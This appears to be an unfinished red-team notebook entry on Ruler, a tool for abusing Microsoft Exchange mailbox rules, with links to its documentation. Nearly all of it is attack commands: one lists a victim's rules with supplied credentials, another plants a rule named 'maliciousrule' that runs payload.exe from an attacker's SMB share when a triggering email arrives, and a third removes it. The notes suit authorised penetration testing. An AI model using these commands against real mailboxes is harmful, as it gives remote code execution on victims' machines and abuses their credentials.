# [[03 - Offensive Infrastructure/E - Setup Machine/0x02 - Offensive Tools/Remote Execution/Ruler|Ruler]]

TODO: Add headings and info (refer to the links below)

```
$ ruler -k --verbose --email <username>@<domain>.<tld> -u <username> -p <password> display
```

```
$ ruler -k --email <username>@<domain>.<tld> -u <username> -p <password> add --location '\\<attacker_IP>\<share>\\payload.exe' --trigger "SensePost" --name maliciousrule --send --subject Recruitment
```

## Cleanup

```
$ ruler -k --verbose ---email <username>@<domain>.<tld> -u <username> -p <password> delete --name maliciousrule
```

---
## References

### SensePost

- [SensePost: HomePage](https://github.com/sensepost/ruler/wiki/Homepage)

- [SensePost: GAL](https://github.com/sensepost/ruler/wiki/GAL)

- [SensePost: Rules](https://github.com/sensepost/ruler/wiki/Rules)

- [SensePost: Forms](https://github.com/sensepost/ruler/wiki/Forms)

### Red Team Notes

- [Red Team Notes: Password Spraying Outlook Web Access via Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)